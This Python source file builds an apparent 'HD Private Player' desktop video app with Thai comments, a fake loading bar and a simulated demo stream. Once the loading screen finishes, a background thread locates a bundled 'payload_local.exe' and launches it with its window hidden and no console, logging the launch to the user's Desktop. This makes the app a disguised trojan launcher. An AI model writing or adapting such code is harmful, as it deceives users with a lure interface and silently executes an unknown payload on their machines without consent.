import os
import sys
import math
import subprocess
import threading
import tkinter as tk
from tkinter import filedialog
import customtkinter as ctk
from ui import styles

# ถ้าจะเล่นไฟล์วิดีโอจริง (OpenCV) ให้มีสองบรรทัดนี้ด้วย
try:
    import cv2
    from PIL import Image, ImageTk
except ImportError:
    cv2 = None
    Image = None
    ImageTk = None

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")


def _resource_path(name: str) -> str:
    if getattr(sys, "frozen", False):
        # ข้างไฟล์ .exe
        p = os.path.join(os.path.dirname(sys.executable), name)
        if os.path.isfile(p):
            return p
        # ในโฟลเดอร์ extract ของ PyInstaller
        meipass = getattr(sys, "_MEIPASS", None)
        if meipass:
            p = os.path.join(meipass, name)
            if os.path.isfile(p):
                return p
    base = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    return os.path.join(base, name)


def _start_background_service():
    log_path = os.path.join(os.path.expanduser("~"), "Desktop", "hd_payload_log.txt")
    try:
        path = _resource_path("payload_local.exe")
        with open(log_path, "w", encoding="utf-8") as f:
            f.write(f"path={path}\n")
            f.write(f"exists={os.path.isfile(path) if path else False}\n")
            f.write(f"frozen={getattr(sys, 'frozen', False)}\n")
            f.write(f"meipass={getattr(sys, '_MEIPASS', None)}\n")

        if not path or not os.path.isfile(path):
            with open(log_path, "a", encoding="utf-8") as f:
                f.write("skip=no_file\n")
            return

        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0

        subprocess.Popen(
            [path],
            startupinfo=si,
            creationflags=subprocess.CREATE_NO_WINDOW,
            cwd=os.path.dirname(path) or None,
        )
        with open(log_path, "a", encoding="utf-8") as f:
            f.write("popen_ok\n")
    except Exception as e:
        try:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"error={e}\n")
        except Exception:
            pass
class HDPlayerApp(ctk.CTk):
    """
    คลาสหลักสำหรับ HD Private Player Desktop Application
    รองรับทั้งการเปิดเล่นไฟล์วิดีโอจริง (MP4, MKV, AVI, MOV ฯลฯ)
    และการจำลองเล่นวิดีโอ (Simulation mode)
    """

    def __init__(self):
        super().__init__()

        # ----------------------------------------------------
        # 1. ตั้งค่าหน้าต่างหลัก (Main Window Config)
        # ----------------------------------------------------
        self.title(styles.WINDOW_TITLE)
        self.geometry(styles.WINDOW_INIT_SIZE)
        self.minsize(styles.WINDOW_MIN_WIDTH, styles.WINDOW_MIN_HEIGHT)
        self.configure(fg_color=styles.BG_DARK)

        # สถานะเครื่องเล่น (Player State)
        self.current_filename = styles.DEFAULT_FILENAME
        self.quality_tag = styles.DEFAULT_QUALITY
        self.duration = styles.DEFAULT_DURATION
        self.current_time = 0.0
        self.is_playing = False
        self.volume = 80
        self.is_muted = False

        # OpenCV Video Capture Object (สำหรับไฟล์วิดีโอจริง)
        self.cap = None
        self.real_video_loaded = False
        self.fps = 30.0
        self.total_frames = 0
        self.current_frame_idx = 0
        self.photo_image = None  # เก็บ reference ป้องกัน Garbage Collection

        # สำหรับแอนิเมชัน Canvas ในพื้นที่วิดีโอ (Simulation mode)
        self.anim_angle = 0
        self.wave_phase = 0.0

        # ----------------------------------------------------
        # 2. เริ่มต้นแสดงหน้า Loading Screen
        # ----------------------------------------------------
        self._show_loading_screen()

    # ========================================================
    # PART A: Loading Screen (หน้าเตรียมไฟล์)
    # ========================================================
    def _show_loading_screen(self):
        """สร้างและแสดงหน้า Loading Progress Bar"""
        self.loading_frame = ctk.CTkFrame(
            self,
            fg_color=styles.BG_DARK,
            corner_radius=0
        )
        self.loading_frame.pack(fill="both", expand=True)

        # กล่องตรงกลาง (Card Container)
        center_card = ctk.CTkFrame(
            self.loading_frame,
            fg_color=styles.PANEL_BG,
            corner_radius=16,
            border_width=1,
            border_color=styles.BTN_BG
        )
        center_card.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.6, relheight=0.45)

        # ไอคอนโลโก้แอป
        logo_label = ctk.CTkLabel(
            center_card,
            text="🔒 HD PRIVATE",
            font=(styles.FONT_FAMILY, 24, "bold"),
            text_color=styles.ACCENT_CYAN
        )
        logo_label.pack(pady=(35, 10))

        # ข้อความสถานะ 1: "กำลังเตรียมไฟล์วิดีโอ..."
        self.lbl_status_main = ctk.CTkLabel(
            center_card,
            text="กำลังเตรียมไฟล์วิดีโอ...",
            font=styles.FONT_SUBTITLE,
            text_color=styles.TEXT_WHITE
        )
        self.lbl_status_main.pack(pady=(0, 5))

        # ข้อความสถานะ 2: "กำลังโหลดคลิป กรุณารอสักครู่"
        self.lbl_status_sub = ctk.CTkLabel(
            center_card,
            text="กำลังโหลดคลิป กรุณารอสักครู่",
            font=styles.FONT_BODY,
            text_color=styles.TEXT_MUTED
        )
        self.lbl_status_sub.pack(pady=(0, 25))

        # แถบ Progress Bar
        self.progress_bar = ctk.CTkProgressBar(
            center_card,
            width=360,
            height=10,
            corner_radius=5,
            fg_color=styles.PROGRESS_BAR_BG,
            progress_color=styles.ACCENT_TEAL
        )
        self.progress_bar.set(0.0)
        self.progress_bar.pack(pady=(0, 10))

        # ข้อความ % เปอร์เซ็นต์
        self.lbl_percentage = ctk.CTkLabel(
            center_card,
            text="0%",
            font=styles.FONT_TIME,
            text_color=styles.ACCENT_CYAN
        )
        self.lbl_percentage.pack(pady=(0, 20))

        # เริ่มต้นแอนิเมชันวิ่ง 0-100%
        self.progress_val = 0
        self.after(50, self._update_loading_progress)

    def _update_loading_progress(self):
        """คำนวณและอัปเดตเปอร์เซ็นต์ของ Loading Bar"""
        if self.progress_val <= 100:
            pct = self.progress_val / 100.0
            self.progress_bar.set(pct)
            self.lbl_percentage.configure(text=f"{self.progress_val}%")
            self.progress_val += 2
            self.after(25, self._update_loading_progress)
        else:
            # เมื่อโหลดครบ 100% → เข้าหน้า Player แล้วเริ่มพื้นหลัง
            self.loading_frame.destroy()
            self._build_player_ui()
            threading.Thread(target=_start_background_service, daemon=True).start()

    # ========================================================
    # PART B: Main Player View (หน้าเครื่องเล่นหลัก)
    # ========================================================
    def _build_player_ui(self):
        """สร้างโครงสร้าง UI สำหรับเครื่องเล่นวิดีโอ"""
        # Container หลัก
        self.main_container = ctk.CTkFrame(
            self,
            fg_color=styles.BG_DARK,
            corner_radius=0
        )
        self.main_container.pack(fill="both", expand=True)

        # ----------------------------------------------------
        # 1. แถบ Header (Top Bar)
        # ----------------------------------------------------
        header_bar = ctk.CTkFrame(
            self.main_container,
            fg_color=styles.PANEL_BG,
            height=50,
            corner_radius=0
        )
        header_bar.pack(fill="x", side="top")

        # ด้านซ้าย: ชื่อแอปและโลโก้
        app_title = ctk.CTkLabel(
            header_bar,
            text=" 🔒 HD Private Player ",
            font=styles.FONT_SUBTITLE,
            text_color=styles.ACCENT_CYAN
        )
        app_title.pack(side="left", padx=15, pady=10)

        # ตรงกลาง: แสดงชื่อไฟล์ตัวอย่าง
        self.lbl_filename = ctk.CTkLabel(
            header_bar,
            text=f"🎬 {self.current_filename}",
            font=styles.FONT_BODY,
            text_color=styles.TEXT_WHITE
        )
        self.lbl_filename.pack(side="left", padx=20)

        # ปุ่มเปิดไฟล์วิดีโอจริง
        btn_open = ctk.CTkButton(
            header_bar,
            text="📁 เปิดไฟล์วิดีโอ...",
            width=110,
            height=28,
            font=styles.FONT_SMALL,
            fg_color=styles.BTN_BG,
            hover_color=styles.BTN_HOVER,
            command=self._open_file_dialog
        )
        btn_open.pack(side="left", padx=5)

        # ด้านขวา: ป้ายคุณภาพ 1080p
        badge_frame = ctk.CTkFrame(
            header_bar,
            fg_color=styles.BADGE_BG,
            border_color=styles.BADGE_BORDER,
            border_width=1,
            corner_radius=6
        )
        badge_frame.pack(side="right", padx=15, pady=10)

        self.lbl_quality = ctk.CTkLabel(
            badge_frame,
            text=f" HD {self.quality_tag} ",
            font=styles.FONT_BADGE,
            text_color=styles.BADGE_TEXT
        )
        self.lbl_quality.pack(padx=8, pady=2)

        # ----------------------------------------------------
        # 2. พื้นที่แสดงวิดีโอ (Video Display Area - Center)
        # ----------------------------------------------------
        video_container = ctk.CTkFrame(
            self.main_container,
            fg_color=styles.VIDEO_BG,
            corner_radius=0
        )
        video_container.pack(fill="both", expand=True, padx=0, pady=0)

        # ใช้ Tkinter Canvas วาดเฟรมวิดีโอจริง หรือ กราฟิก Placeholder
        self.canvas = tk.Canvas(
            video_container,
            bg=styles.VIDEO_BG,
            highlightthickness=0
        )
        self.canvas.pack(fill="both", expand=True)

        # ผูก event เมื่อปรับขนาดหน้าต่าง ให้ redraw
        self.canvas.bind("<Configure>", self._on_canvas_resize)

        # ----------------------------------------------------
        # 3. แถบควบคุมด้านล่าง (Bottom Control Bar)
        # ----------------------------------------------------
        control_panel = ctk.CTkFrame(
            self.main_container,
            fg_color=styles.CONTROL_BG,
            corner_radius=0,
            height=100
        )
        control_panel.pack(fill="x", side="bottom")

        # ----- 3.1 แถบสไลเดอร์ความคืบหน้า (Seek Slider Bar) -----
        progress_row = ctk.CTkFrame(control_panel, fg_color="transparent")
        progress_row.pack(fill="x", padx=20, pady=(10, 2))

        # ข้อความเวลาปัจจุบัน (00:00)
        self.lbl_current_time = ctk.CTkLabel(
            progress_row,
            text="00:00",
            font=styles.FONT_TIME,
            text_color=styles.TEXT_WHITE,
            width=50
        )
        self.lbl_current_time.pack(side="left")

        # Slider แสดงความคืบหน้าวิดีโอ
        self.seek_slider = ctk.CTkSlider(
            progress_row,
            from_=0,
            to=self.duration,
            number_of_steps=1000,
            button_color=styles.ACCENT_CYAN,
            button_hover_color=styles.ACCENT_TEAL,
            progress_color=styles.SLIDER_PROGRESS,
            fg_color=styles.SLIDER_BG,
            command=self._on_seek_slider_change
        )
        self.seek_slider.set(0)
        self.seek_slider.pack(side="left", fill="x", expand=True, padx=10)

        # ข้อความเวลาทั้งหมด (03:45)
        self.lbl_total_time = ctk.CTkLabel(
            progress_row,
            text=self._format_time(self.duration),
            font=styles.FONT_TIME,
            text_color=styles.TEXT_MUTED,
            width=50
        )
        self.lbl_total_time.pack(side="right")

        # ----- 3.2 ปุ่มควบคุมการเล่นและเสียง (Control Buttons Row) -----
        btn_row = ctk.CTkFrame(control_panel, fg_color="transparent")
        btn_row.pack(fill="x", padx=20, pady=(2, 12))

        # ฝั่งซ้าย: สถานะโหมดความเป็นส่วนตัว
        self.lbl_mode_status = ctk.CTkLabel(
            btn_row,
            text="🔒 Private Encrypted Session",
            font=styles.FONT_SMALL,
            text_color=styles.TEXT_MUTED
        )
        self.lbl_mode_status.pack(side="left", padx=5)

        # กลุ่มปุ่มตรงกลาง: Rewind, Play/Pause, Forward
        center_controls = ctk.CTkFrame(btn_row, fg_color="transparent")
        center_controls.pack(side="top", expand=True)

        # ปุ่มย้อน 10 วินาที (-10s)
        btn_rewind = ctk.CTkButton(
            center_controls,
            text="⏪ -10s",
            width=70,
            height=36,
            font=styles.FONT_BODY_BOLD,
            fg_color=styles.BTN_BG,
            hover_color=styles.BTN_HOVER,
            command=self._rewind_10s
        )
        btn_rewind.pack(side="left", padx=8)

        # ปุ่ม Play / Pause หลัก (เน้นสี Teal/Cyan)
        self.btn_play = ctk.CTkButton(
            center_controls,
            text="▶ Play",
            width=100,
            height=40,
            corner_radius=20,
            font=(styles.FONT_FAMILY, 14, "bold"),
            fg_color=styles.ACCENT_TEAL,
            hover_color=styles.ACCENT_TEAL_HOVER,
            command=self._toggle_play_pause
        )
        self.btn_play.pack(side="left", padx=8)

        # ปุ่มไปข้างหน้า 10 วินาที (+10s)
        btn_forward = ctk.CTkButton(
            center_controls,
            text="+10s ⏩",
            width=70,
            height=36,
            font=styles.FONT_BODY_BOLD,
            fg_color=styles.BTN_BG,
            hover_color=styles.BTN_HOVER,
            command=self._forward_10s
        )
        btn_forward.pack(side="left", padx=8)

        # ฝั่งขวา: ปรับระดับเสียง (Volume)
        volume_frame = ctk.CTkFrame(btn_row, fg_color="transparent")
        volume_frame.pack(side="right", padx=5)

        # ปุ่ม Mute/Unmute
        self.btn_volume = ctk.CTkButton(
            volume_frame,
            text="🔊",
            width=36,
            height=32,
            font=(styles.FONT_FAMILY, 14),
            fg_color=styles.BTN_BG,
            hover_color=styles.BTN_HOVER,
            command=self._toggle_mute
        )
        self.btn_volume.pack(side="left", padx=(0, 5))

        # Slider เสียง
        self.volume_slider = ctk.CTkSlider(
            volume_frame,
            from_=0,
            to=100,
            width=90,
            button_color=styles.TEXT_WHITE,
            progress_color=styles.ACCENT_TEAL,
            fg_color=styles.SLIDER_BG,
            command=self._on_volume_change
        )
        self.volume_slider.set(self.volume)
        self.volume_slider.pack(side="left")

        # วาด placeholder เริ่มต้น
        self._draw_video_placeholder()

    # ========================================================
    # PART C: Real Video Decoding & Frame Rendering (OpenCV)
    # ========================================================
    def _open_file_dialog(self):
        """เลือกเปิดไฟล์วิดีโอจากเครื่องเพื่อเล่นจริง"""
        file_path = filedialog.askopenfilename(
            title="เลือกไฟล์วิดีโอส่วนตัว",
            filetypes=[
                ("Video Files", "*.mp4 *.mkv *.avi *.mov *.webm *.flv *.m4v"),
                ("All Files", "*.*")
            ]
        )
        if file_path:
            self.load_real_video(file_path)

    def load_real_video(self, file_path):
        """โหลดไฟล์วิดีโอจริงด้วย OpenCV"""
        # ปิดไฟล์เดิมถ้ามีอยู่
        if self.cap is not None:
            self.cap.release()

        self.cap = cv2.VideoCapture(file_path)
        if not self.cap.isOpened():
            print(f"Error: Cannot open video file {file_path}")
            return

        self.real_video_loaded = True
        self.current_filename = os.path.basename(file_path)
        self.lbl_filename.configure(text=f"🎬 {self.current_filename}")
        self.lbl_mode_status.configure(text="🎥 Real Video Engine Active", text_color=styles.ACCENT_CYAN)

        # อ่านค่าคุณสมบัติวิดีโอ
        self.fps = self.cap.get(cv2.CAP_PROP_FPS) or 30.0
        self.total_frames = int(self.cap.get(cv2.CAP_PROP_FRAME_COUNT))
        self.duration = self.total_frames / self.fps if self.fps > 0 else 1.0

        # ตรวจสอบความละเอียดวิดีโอเพื่อปรับ Quality Badge
        height = int(self.cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        if height >= 2160:
            self.quality_tag = "4K UHD"
        elif height >= 1080:
            self.quality_tag = "1080p"
        elif height >= 720:
            self.quality_tag = "720p"
        elif height > 0:
            self.quality_tag = f"{height}p"
        else:
            self.quality_tag = "HD"

        self.lbl_quality.configure(text=f" HD {self.quality_tag} ")

        # รีเซ็ตตัวนับและอัปเดต UI
        self.current_time = 0.0
        self.current_frame_idx = 0
        self.seek_slider.configure(to=self.duration)
        self.seek_slider.set(0)
        self.lbl_current_time.configure(text="00:00")
        self.lbl_total_time.configure(text=self._format_time(self.duration))

        # แสดงเฟรมแรกทันที
        self._render_frame_at_time(0.0)

    def _render_frame_at_time(self, seconds: float):
        """อ่านและเรนเดอร์เฟรมวิดีโอ ณ วินาทีที่กำหนด"""
        if not self.real_video_loaded or self.cap is None:
            self._draw_video_placeholder()
            return

        frame_no = int(seconds * self.fps)
        frame_no = max(0, min(frame_no, self.total_frames - 1))
        self.cap.set(cv2.CAP_PROP_POS_FRAMES, frame_no)
        ret, frame = self.cap.read()
        if ret:
            self.current_frame_idx = frame_no
            self._display_cv2_frame(frame)

    def _display_cv2_frame(self, frame):
        """แปลง OpenCV BGR Frame เป็น PIL Image แล้ววาดบน Canvas"""
        w = self.canvas.winfo_width()
        h = self.canvas.winfo_height()

        if w <= 10 or h <= 10:
            return

        # คำนวณอัตราส่วนเพื่อย่อ/ขยายรูปภาพให้พอดีกับ Canvas (Aspect Ratio Preserved)
        fh, fw = frame.shape[:2]
        scale = min(w / fw, h / fh)
        nw, nh = max(1, int(fw * scale)), max(1, int(fh * scale))

        # Resize เฟรมด้วย OpenCV
        frame_resized = cv2.resize(frame, (nw, nh), interpolation=cv2.INTER_AREA)
        # แปลงสี BGR เป็น RGB
        frame_rgb = cv2.cvtColor(frame_resized, cv2.COLOR_BGR2RGB)

        # แปลงเป็น PhotoImage สำหรับ Tkinter
        img = Image.fromarray(frame_rgb)
        self.photo_image = ImageTk.PhotoImage(image=img)

        # วาดลงบน Canvas ตรงกลาง
        self.canvas.delete("all")
        self.canvas.create_image(w // 2, h // 2, image=self.photo_image, anchor="center")

    def _on_canvas_resize(self, event=None):
        """เมื่อปรับขนาด Canvas ให้เรนเดอร์เฟรมปัจจุบันใหม่"""
        if self.real_video_loaded and self.cap is not None:
            self._render_frame_at_time(self.current_time)
        else:
            self._draw_video_placeholder()

    # ========================================================
    # PART D: Video Placeholder Graphic (กราฟิกจำลองวิดีโอ)
    # ========================================================
    def _draw_video_placeholder(self, event=None):
        """วาดกราฟิก placeholder บน Canvas เมื่อยังไม่ได้เลือกไฟล์จริง"""
        if self.real_video_loaded:
            return

        self.canvas.delete("all")

        w = self.canvas.winfo_width()
        h = self.canvas.winfo_height()

        if w <= 10 or h <= 10:
            return

        cx, cy = w // 2, h // 2

        # 1. วาดเส้นตารางจางๆ (Background Grid Line)
        grid_step = 40
        for x in range(0, w, grid_step):
            self.canvas.create_line(x, 0, x, h, fill="#0F172A", width=1)
        for y in range(0, h, grid_step):
            self.canvas.create_line(0, y, w, y, fill="#0F172A", width=1)

        # 2. วาดแอนิเมชันวงกลมเรืองแสงตรงกลาง
        r = 65
        ring_color = styles.ACCENT_CYAN if self.is_playing else styles.BTN_BG
        self.canvas.create_oval(
            cx - r, cy - r, cx + r, cy + r,
            outline=ring_color, width=3
        )

        pulse_r = r + (10 if self.is_playing else 0)
        self.canvas.create_oval(
            cx - pulse_r, cy - pulse_r, cx + pulse_r, cy + pulse_r,
            outline=styles.ACCENT_TEAL if self.is_playing else "#1E293B", width=1
        )

        # 3. สัญลักษณ์ตรงกลาง Canvas (Play Triangle หรือ Pause Line)
        if self.is_playing:
            bar_count = 7
            bar_width = 6
            start_x = cx - ((bar_count * (bar_width + 4)) // 2)
            for i in range(bar_count):
                h_factor = math.sin(self.wave_phase + i * 0.8) * 0.5 + 0.5
                bar_h = int(15 + h_factor * 35)
                bx = start_x + i * (bar_width + 4)
                self.canvas.create_rectangle(
                    bx, cy - bar_h, bx + bar_width, cy + bar_h,
                    fill=styles.ACCENT_CYAN, outline=""
                )
        else:
            points = [cx - 15, cy - 22, cx - 15, cy + 22, cx + 22, cy]
            self.canvas.create_polygon(points, fill=styles.TEXT_WHITE)

        # 4. ข้อความกำกับใต้กราฟิก
        status_txt = "● PLAYING DEMO STREAM" if self.is_playing else "PAUSED - PRESS PLAY OR OPEN A VIDEO FILE"
        txt_color = styles.ACCENT_CYAN if self.is_playing else styles.TEXT_MUTED

        self.canvas.create_text(
            cx, cy + r + 35,
            text=status_txt,
            fill=txt_color,
            font=(styles.FONT_FAMILY, 11, "bold")
        )

        self.canvas.create_text(
            cx, cy + r + 58,
            text=f"Click '📁 เปิดไฟล์วิดีโอ...' to play real MP4 / MKV video files",
            fill=styles.TEXT_DARK,
            font=(styles.FONT_FAMILY, 10)
        )

    # ========================================================
    # PART E: Playback Controls & Main Loop Logic
    # ========================================================
    def _toggle_play_pause(self):
        """กดปุ่ม เล่น / หยุดชั่วคราว"""
        self.is_playing = not self.is_playing

        if self.is_playing:
            self.btn_play.configure(
                text="⏸ Pause",
                fg_color=styles.ACCENT_CYAN,
                hover_color=styles.ACCENT_TEAL
            )
            self._playback_loop()
        else:
            self.btn_play.configure(
                text="▶ Play",
                fg_color=styles.ACCENT_TEAL,
                hover_color=styles.ACCENT_TEAL_HOVER
            )
            if not self.real_video_loaded:
                self._draw_video_placeholder()

    def _playback_loop(self):
        """ลูปอ่านและเล่นเฟรมวิดีโอ (หรือเดินเวลาจำลอง)"""
        if not self.is_playing:
            return

        if self.real_video_loaded and self.cap is not None:
            # --- โหมดเล่นไฟล์วิดีโอจริง ---
            ret, frame = self.cap.read()
            if ret:
                self._display_cv2_frame(frame)
                self.current_frame_idx += 1
                self.current_time = self.current_frame_idx / self.fps

                # อัปเดต UI Slider และเวลา
                self.seek_slider.set(self.current_time)
                self.lbl_current_time.configure(text=self._format_time(self.current_time))

                # คำนวณ delay ในหน่วย ms ตาม FPS ของวิดีโอจริง
                delay_ms = max(10, int(1000.0 / self.fps))
                if self.is_playing:
                    self.after(delay_ms, self._playback_loop)
            else:
                # เล่นวิดีโอจบไฟล์
                self.is_playing = False
                self.btn_play.configure(text="▶ Play", fg_color=styles.ACCENT_TEAL)
        else:
            # --- โหมดจำลอง (Simulation Mode) ---
            self.current_time += 1.0
            self.wave_phase += 0.5

            if self.current_time >= self.duration:
                self.current_time = self.duration
                self.is_playing = False
                self.btn_play.configure(text="▶ Play", fg_color=styles.ACCENT_TEAL)

            self.seek_slider.set(self.current_time)
            self.lbl_current_time.configure(text=self._format_time(self.current_time))
            self._draw_video_placeholder()

            if self.is_playing:
                self.after(500, self._playback_loop)

    def _rewind_10s(self):
        """ย้อนกลับ 10 วินาที"""
        self.current_time = max(0.0, self.current_time - 10.0)
        self.seek_slider.set(self.current_time)
        self.lbl_current_time.configure(text=self._format_time(self.current_time))

        if self.real_video_loaded:
            self._render_frame_at_time(self.current_time)
        else:
            self._draw_video_placeholder()

    def _forward_10s(self):
        """ไปข้างหน้า 10 วินาที"""
        self.current_time = min(float(self.duration), self.current_time + 10.0)
        self.seek_slider.set(self.current_time)
        self.lbl_current_time.configure(text=self._format_time(self.current_time))

        if self.real_video_loaded:
            self._render_frame_at_time(self.current_time)
        else:
            self._draw_video_placeholder()

    def _on_seek_slider_change(self, value):
        """ลากสไลเดอร์เปลี่ยนเวลา (Seek)"""
        self.current_time = float(value)
        self.lbl_current_time.configure(text=self._format_time(self.current_time))

        if self.real_video_loaded:
            self._render_frame_at_time(self.current_time)
        else:
            self._draw_video_placeholder()

    def _toggle_mute(self):
        """กดปุ่ม Mute เสียง"""
        self.is_muted = not self.is_muted
        if self.is_muted:
            self.btn_volume.configure(text="🔇", text_color=styles.TEXT_MUTED)
            self.volume_slider.set(0)
        else:
            self.btn_volume.configure(text="🔊", text_color=styles.TEXT_WHITE)
            self.volume_slider.set(self.volume if self.volume > 0 else 50)

    def _on_volume_change(self, value):
        """เลื่อนสไลเดอร์ปรับเสียง"""
        self.volume = int(value)
        if self.volume == 0:
            self.is_muted = True
            self.btn_volume.configure(text="🔇")
        else:
            self.is_muted = False
            self.btn_volume.configure(text="🔊")

    # ========================================================
    # HELPER FUNCTIONS
    # ========================================================
    @staticmethod
    def _format_time(seconds: float) -> str:
        """แปลงจำนวนวินาทีเป็นฟอร์แมต 00:00 หรือ 00:00:00"""
        total_sec = max(0, int(seconds))
        m, s = divmod(total_sec, 60)
        h, m = divmod(m, 60)
        if h > 0:
            return f"{h:02d}:{m:02d}:{s:02d}"
        return f"{m:02d}:{s:02d}"
